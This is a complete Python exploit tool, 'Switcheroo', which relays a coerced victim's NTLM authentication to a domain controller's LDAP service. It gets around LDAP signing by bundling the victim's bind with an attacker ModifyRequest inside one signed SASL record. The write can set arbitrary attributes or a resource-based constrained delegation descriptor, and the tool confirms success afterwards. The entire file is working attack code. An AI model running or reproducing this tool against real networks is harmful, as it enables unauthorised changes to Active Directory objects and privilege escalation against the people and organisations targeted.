#!/usr/bin/env python3
import argparse
import os
import random
import runpy
import shutil
import struct
import sys
import sysconfig
import time
from struct import unpack

from impacket import ntlm
from impacket.examples.ntlmrelayx import clients as relay_clients
from impacket.examples.ntlmrelayx.attacks.ldapattack import create_allow_ace, create_empty_sd
from impacket.examples.ntlmrelayx.clients import ldaprelayclient
from impacket.examples.utils import parse_target
from impacket.ldap import ldaptypes
from impacket.ldap.ldap import LDAPConnection, get_entry_values
from impacket.ldap.ldapasn1 import BindRequest, LDAPMessage, ModifyRequest, ResultCode, Scope, \
    SearchResultEntry
from impacket.nt_errors import STATUS_ACCESS_DENIED
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from pyasn1.codec.ber import decoder, encoder


def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True,
        description="Switcheroo - LDAP signing bypass during reauthentication",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "target", action="store",
        help="[[domain/]username[:password]@]<targetName or address> - the attacker-controlled "
             "account that opens the initial signed LDAP connection, and the target DC",
    )
    parser.add_argument("-ts", action="store_true", help="adds a timestamp to every logging output")
    parser.add_argument("-debug", action="store_true", help="turn DEBUG output ON")

    group = parser.add_argument_group("authentication")
    group.add_argument("-hashes", action="store", metavar="LMHASH:NTHASH",
                       help="NTLM hashes for the attacker account, format LMHASH:NTHASH")
    group.add_argument("-no-pass", action="store_true", help="don't ask for password (useful with -hashes)")
    group.add_argument("-use-kerberos", "-k", action="store_true",
                       help="authenticate the attacker's signed LDAP connections with Kerberos "
                            "instead of NTLM (password/hashes are used for a TGT; the relayed "
                            "victim authentication is unaffected)")
    group.add_argument("-dc-ip", action="store", metavar="ip address",
                       help="IP address of the target DC. If omitted, the targetName from the "
                            "target argument is used")
    group.add_argument("-base-dn", action="store", metavar="DN",
                       help="search base, e.g. DC=example,DC=com. Default: the DC's "
                            "rootDSE defaultNamingContext")

    group = parser.add_argument_group("relay listener")
    group.add_argument("-ntlmrelayx", action="store", metavar="PATH",
                       help="path to a specific ntlmrelayx.py to run instead of the installed one")
    group.add_argument("-listen-ip", action="store", metavar="ip address", default="0.0.0.0",
                       help="attacker listener IP the coerced victim connects to (default: 0.0.0.0, "
                            "all interfaces)")
    group.add_argument("-victim", action="store", metavar="DOMAIN/account",
                       help="only relay this victim; others are rejected")

    group = parser.add_argument_group("attack (operation executed as the victim)")
    target = group.add_mutually_exclusive_group()
    target.add_argument("-modify-dn", action="store", metavar="DN",
                        help="DN of the directory object to modify as the victim. Default: the "
                             "DN of the relayed victim")
    target.add_argument("-modify-sam", action="store", metavar="ACCOUNT",
                        help="sAMAccountName of the object to modify as the victim, resolved to "
                             "its DN via LDAP. Default: the relayed victim's own account")
    group.add_argument("-attribute", action="store", default="description",
                       help="attribute to write with -value/-value-hex (default: description)")
    payload = group.add_mutually_exclusive_group(required=True)
    payload.add_argument("-value", action="store", help="UTF-8 attribute value")
    payload.add_argument("-value-hex", action="store", help="binary attribute value as hex")
    payload.add_argument("-rbcd", action="store", metavar="ACCOUNT|SID",
                         help="write an RBCD descriptor granting this account (sAMAccountName, "
                              "resolved to its objectSid via LDAP) or this raw SID "
                              "(msDS-AllowedToActOnBehalfOfOtherIdentity)")
    return parser


def resolve_ntlmrelayx(explicit=None):
    candidates = (
        explicit,
        # the script runs under this interpreter, so it must come from this venv; a
        # PATH ntlmrelayx.py belongs to another impacket install and mismatches
        os.path.join(sysconfig.get_path("scripts"), "ntlmrelayx.py"),
        shutil.which("ntlmrelayx.py"),
        shutil.which("ntlmrelayx"),
    )
    for candidate in candidates:
        if candidate and os.path.isfile(candidate):
            return os.path.abspath(candidate)
    raise SystemExit("ntlmrelayx.py not found; reinstall the project (uv tool install --force .) "
                     "or pass -ntlmrelayx /path/to/ntlmrelayx.py")


def signed_ldap_bind(conn):
    """Authenticate the attacker's own signed LDAP session (NTLM by default, Kerberos with -k)."""
    if use_kerberos:
        conn.kerberosLogin(username, password, domain, lmhash, nthash,
                           kdcHost=ldap_ip, useCache=False)
    else:
        conn.login(username, password, domain, lmhash, nthash, authenticationChoice="sasl")


def search_values(conn, search_base, scope, search_filter, attributes):
    entries = conn.search(searchBase=search_base, scope=scope,
                          searchFilter=search_filter, attributes=attributes)
    # a subtree search also returns SearchResultReference (referral) objects
    return [value.asOctets()
            for entry in entries if isinstance(entry, SearchResultEntry)
            for attribute in attributes
            for value in get_entry_values(entry, attribute)]


def validate_bootstrap():
    """Bind once at startup so broken credentials fail before any coercion begins."""
    try:
        conn = LDAPConnection(
            f"ldap://{ldap_host}", args.base_dn or "",
            dstIp=ldap_ip, signing=True, timeout=8,
        )
    except Exception as error:
        raise SystemExit(f"[-] Cannot reach ldap://{ldap_host}: {error}")
    try:
        signed_ldap_bind(conn)
        print(f"[+] Bootstrap identity validated: {domain}\\{username}", flush=True)
        if not args.base_dn:
            roots = search_values(conn, "", Scope("baseObject"), "(objectClass=*)",
                                  ["defaultNamingContext"])
            if not roots:
                raise SystemExit("[-] DC returned no defaultNamingContext; pass -base-dn")
            args.base_dn = roots[0].decode()
            print(f"[i] base-dn from rootDSE: {args.base_dn}", flush=True)
    except SystemExit:
        raise
    except Exception as error:
        raise SystemExit(f"[-] Bootstrap bind as {domain}\\{username} failed: {error}")
    finally:
        conn.close()


def ldap_escape(value):
    for raw, escaped in (("\\", "\\5c"), ("*", "\\2a"), ("(", "\\28"),
                         (")", "\\29"), ("\x00", "\\00")):
        value = value.replace(raw, escaped)
    return value


def query(search_base, scope, search_filter, attributes):
    conn = LDAPConnection(
        f"ldap://{ldap_host}", search_base,
        dstIp=ldap_ip, signing=True, timeout=8,
    )
    try:
        signed_ldap_bind(conn)
        return search_values(conn, search_base, scope, search_filter, attributes)
    finally:
        conn.close()


def resolve_account_dn(account):
    """Authoritative DN for an account, so the OU never has to be guessed."""
    dns = query(args.base_dn, Scope("wholeSubtree"),
                f"(sAMAccountName={ldap_escape(account)})", ["distinguishedName"])
    if len(dns) != 1:
        raise ValueError(f"{len(dns)} objects match sAMAccountName={account}")
    return dns[0].decode()


def resolve_account_sid(account):
    values = query(args.base_dn, Scope("wholeSubtree"),
                   f"(sAMAccountName={ldap_escape(account)})", ["objectSid"])
    if len(values) != 1:
        raise ValueError(f"{len(values)} objects match sAMAccountName={account}")
    sid = ldaptypes.LDAP_SID()
    sid.fromString(values[0])
    return sid.formatCanonical()


def ldap_message(operation):
    message = LDAPMessage()
    message["messageID"] = random.randrange(1, 2147483647)
    message["protocolOp"].setComponentByType(operation.getTagSet(), operation)
    return encoder.encode(message)


def gss_token(token):
    """Wrap a raw SPNEGO token in an LDAP SASL (GSS-SPNEGO) BindRequest."""
    request = BindRequest()
    request["version"] = 3
    request["name"] = ""
    request["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
    request["authentication"]["sasl"]["credentials"] = token
    return request


def operation_value():
    """Return (attribute, value) for the attacker-chosen ModifyRequest."""
    if args.rbcd:
        descriptor = create_empty_sd()
        descriptor["Dacl"].aces.append(create_allow_ace(args.rbcd))
        return "msDS-AllowedToActOnBehalfOfOtherIdentity", descriptor.getData()
    if args.value_hex:
        return args.attribute, bytes.fromhex(args.value_hex)
    return args.attribute, args.value.encode()


def replace_attribute(attribute, value):
    request = ModifyRequest()
    request["object"] = modify_dn
    request["changes"][0]["operation"] = 2  # replace
    request["changes"][0]["modification"]["type"] = attribute
    request["changes"][0]["modification"]["vals"].setComponents(value)
    return request


def read_exact(sock, length):
    value = b""
    while len(value) < length:
        chunk = sock.recv(length - len(value))
        if not chunk:
            raise EOFError("connection closed")
        value += chunk
    return value


def configure_smb_listener():
    """Make ntlmrelayx's SMB server advertise signing-required / SMB 3.1.1 so the
    victim performs a signed SMB handshake (closer to real coercion targets)."""
    from impacket.examples.ntlmrelayx.servers import smbrelayserver
    from impacket import smb3

    original = smbrelayserver.SMBRelayServer.SmbNegotiate

    def negotiate(self, conn_id, smb_server, request, isSMB1=False):
        result = original(self, conn_id, smb_server, request, isSMB1)

        if not result or not result[1]:
            return result
        response = result[1][0]["Data"]
        response["SecurityMode"] = (
            smb3.SMB2_NEGOTIATE_SIGNING_ENABLED | smb3.SMB2_NEGOTIATE_SIGNING_REQUIRED
        )
        if isSMB1:
            # Steer the client onto the SMB2 wildcard so it follows up with a
            # context-bearing SMB2 Negotiate instead of locking to SMB 2.0.2.
            response["DialectRevision"] = smb3.SMB2_DIALECT_WILDCARD
            response["NegotiateContextCount"] = 0
            response["NegotiateContextOffset"] = 0
            return result

        preauth_data = struct.pack("<HHH", 1, 32, 1) + os.urandom(32)
        preauth = struct.pack(
            "<HHI", smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES, len(preauth_data), 0
        ) + preauth_data
        response["DialectRevision"] = smb3.SMB2_DIALECT_311
        response["NegotiateContextCount"] = 1
        context_offset = (0x80 + len(response["Buffer"]) + 7) & ~7
        response["NegotiateContextOffset"] = context_offset
        response["Padding"] = b"\x00" * (context_offset - 0x80 - len(response["Buffer"]))
        response["NegotiateContextList"] = preauth
        return result

    smbrelayserver.SMBRelayServer.SmbNegotiate = negotiate


class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
    """ntlmrelayx LDAP client that drives the same-record bypass."""

    def initConnection(self):
        # The attacker's own signed LDAP session; its session key is known to us.
        self.raw = LDAPConnection(
            f"ldap://{ldap_host}", args.base_dn,
            dstIp=ldap_ip, signing=True, timeout=8,
        )
        signed_ldap_bind(self.raw)
        print(f"[+] Initial signed LDAP identity: {domain}\\{username}", flush=True)
        # Log the exported SASL session key of our own connection -- the key we sign
        # the same-record frame with, and the key the DC verifies that frame under.
        # NTLM keys stay in a login()-local variable upstream, so only Kerberos exposes one.
        try:
            if self.raw._LDAPConnection__auth_type == "KRB5":
                key = self.raw._LDAPConnection__sessionKey
                print(f"[key] attacker exported session key: {bytes(key.contents).hex()}", flush=True)
        except Exception:
            pass
        self.session = self.raw
        return True

    def sendNegotiate(self, negotiateMessage):
        # Forward the victim's NTLM Type 1 to the DC in a GSS-SPNEGO Bind and relay
        # back the DC's Type 2 challenge unchanged.
        type1 = ntlm.NTLMAuthNegotiate()
        type1.fromString(negotiateMessage)
        blob = SPNEGO_NegTokenInit()
        blob["MechTypes"] = [TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]]
        blob["MechToken"] = type1.getData()

        type1_request = gss_token(blob.getData())
        answer = self.raw.sendReceive(type1_request)
        result = answer[0]["protocolOp"]["bindResponse"]
        code = int(result["resultCode"])
        if code != int(ResultCode("saslBindInProgress")):
            raise RuntimeError(f"GSS-SPNEGO Type 1 rejected: {ResultCode(code).prettyPrint()}")
        target_spnego = SPNEGO_NegTokenResp(result["serverSaslCreds"].asOctets())
        challenge = ntlm.NTLMAuthChallenge()
        challenge.fromString(target_spnego["ResponseToken"])
        print("[+] Relayed DC Type 2 challenge back to the victim", flush=True)
        return challenge

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        # The victim's NTLM Type 3 arrives here. Place the final victim Bind and the
        # attacker's ModifyRequest into ONE SASL record signed with the attacker's key.
        token = authenticateMessageBlob
        if unpack("B", token[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            token = SPNEGO_NegTokenResp(token)["ResponseToken"]
        type3 = ntlm.NTLMAuthChallengeResponse()
        type3.fromString(token)
        encoding = "utf-16le" if type3["flags"] & ntlm.NTLMSSP_NEGOTIATE_UNICODE else "ascii"
        victim = "%s\\%s" % (
            type3["domain_name"].decode(encoding),
            type3["user_name"].decode(encoding),
        )
        if expected_victim and victim.casefold() != expected_victim.casefold():
            print(f"[-] Rejected unexpected victim {victim}", flush=True)
            return None, STATUS_ACCESS_DENIED

        account = victim.split("\\")[-1]
        if account.endswith("$") and account[:-1].casefold() == ldap_host.split(".", 1)[0].casefold():
            print(f"[!] victim {victim} matches the relay target's own machine account; DCs refuse "
                  f"same-machine reflection (LOGON_FAILURE) -- coerce a different host", flush=True)

        global modify_dn
        if not modify_dn:
            try:
                modify_dn = resolve_account_dn(account)
            except Exception as error:
                print(f"[-] cannot resolve the DN of {victim} ({error}); pass -modify-dn", flush=True)
                return None, STATUS_ACCESS_DENIED
            print(f"[i] modify-dn from victim: {modify_dn}", flush=True)

        attribute, value = operation_value()
        final = SPNEGO_NegTokenResp()
        final["ResponseToken"] = token
        if len(authenticateMessageBlob) >= 20 and authenticateMessageBlob[-20:-16] == b"\xa3\x12\x04\x10":
            final["mechListMIC"] = authenticateMessageBlob[-16:]

        bind_message = ldap_message(gss_token(final.getData()))
        modify_message = ldap_message(replace_attribute(attribute, value))

        # The two messages, concatenated, protected as a single SASL record with the
        # attacker's own session key. This is the crux of the bypass.
        record = bind_message + modify_message
        wire = self.raw.encrypt(record)
        # encrypt() bypasses send(), which normally bumps the KRB5 seal sequence
        # number; NTLM ignores it.
        self.raw.sequenceNumber += 1
        self.raw._socket.sendall(wire)
        print(f"[+] Sent same-record frame: victim={victim} dn={modify_dn} "
              f"attribute={attribute}", flush=True)

        # Read the two in-record responses (Bind, then Modify) so the DC's verdict is visible.
        for label in ("Bind", "Modify"):
            try:
                length = struct.unpack(">I", read_exact(self.raw._socket, 4))[0]
                plaintext = self.raw.decrypt(struct.pack(">I", length) + read_exact(self.raw._socket, length))
                message, _ = decoder.decode(plaintext, asn1Spec=LDAPMessage())
                result = message["protocolOp"].getComponent()
                print(f"[+]   {label} -> {result['resultCode'].prettyPrint()} "
                      f"{bytes(result['diagnosticMessage']).decode(errors='replace')[:80]}", flush=True)
            except Exception as error:
                print(f"[!]   {label} response unavailable: {type(error).__name__}: {error}", flush=True)

        self._verify(attribute, value)
        # Close the victim's SMB exchange; relay/coercion tools may show FAILED anyway.
        return None, STATUS_ACCESS_DENIED

    def _verify(self, attribute, value):
        """Independent signed connection read-back — the only reliable success signal."""
        time.sleep(1)
        try:
            check = LDAPConnection(
                f"ldap://{ldap_host}", args.base_dn,
                dstIp=ldap_ip, signing=True, timeout=8,
            )
            signed_ldap_bind(check)
            entries = check.search(
                searchBase=modify_dn, scope=0,
                searchFilter="(objectClass=*)", attributes=[attribute],
            )
            found = []
            for entry in entries:
                found.extend(item.asOctets() for item in get_entry_values(entry, attribute))
            check.close()
            if value in found:
                print("[+] SUCCESS: target object now contains the attacker value", flush=True)
            else:
                print("[-] target did not contain the requested value", flush=True)
        except Exception as error:
            print(f"[!] verification unavailable: {type(error).__name__}: {error}", flush=True)

    def killConnection(self):
        try:
            self.raw.close()
        except Exception:
            pass
        self.session = None


def main():
    global args, domain, username, password, lmhash, nthash
    global ldap_host, ldap_ip, expected_victim, use_kerberos, modify_dn

    args = build_parser().parse_args()

    # domain/username:password@targetName  (Impacket-style credential + target parsing).
    # Logging/banner are left to ntlmrelayx (run below) to avoid duplicate handlers.
    domain, username, password, address = parse_target(args.target)
    if not username:
        sys.exit("[-] username is required: domain/username[:password]@host")
    lmhash = nthash = ""
    if args.hashes:
        lmhash, _, nthash = args.hashes.partition(":")
    if not password and not nthash and not args.no_pass:
        from getpass import getpass
        password = getpass("Password:")

    # Normalise to the names the rest of the script uses.
    ldap_host = address
    ldap_ip = args.dc_ip or address
    expected_victim = args.victim.replace("/", "\\") if args.victim else None
    use_kerberos = args.use_kerberos
    modify_dn = args.modify_dn

    validate_bootstrap()

    if args.modify_sam:
        try:
            modify_dn = resolve_account_dn(args.modify_sam)
        except Exception as error:
            raise SystemExit(f"[-] cannot resolve {args.modify_sam!r} to a DN ({error}); "
                             f"pass -modify-dn instead")
        print(f"[i] -modify-sam {args.modify_sam} -> {modify_dn}", flush=True)

    if args.rbcd and not args.rbcd.upper().startswith("S-1-"):
        try:
            resolved = resolve_account_sid(args.rbcd)
        except Exception as error:
            raise SystemExit(f"[-] cannot resolve {args.rbcd!r} to a SID ({error}); "
                             f"pass the SID directly")
        print(f"[i] -rbcd {args.rbcd} -> {resolved}", flush=True)
        args.rbcd = resolved

    relay_clients.PROTOCOL_CLIENTS["LDAP"] = CrossUserLDAPRelayClient
    configure_smb_listener()

    sys.argv = [
        "ntlmrelayx.py", "-t", f"ldap://{ldap_host}", "-ip", args.listen_ip,
        "-smb2support", "--no-multirelay", "--keep-relaying", "--no-http-server",
        "--no-wcf-server", "--no-raw-server", "--no-rpc-server",
        "--no-winrm-server", "--no-mssql-server", "--no-rdp-server",
    ]
    if args.debug:
        sys.argv.append("-debug")
    if args.ts:
        sys.argv.append("-ts")
    runpy.run_path(resolve_ntlmrelayx(args.ntlmrelayx), run_name="__main__")


if __name__ == "__main__":
    main()
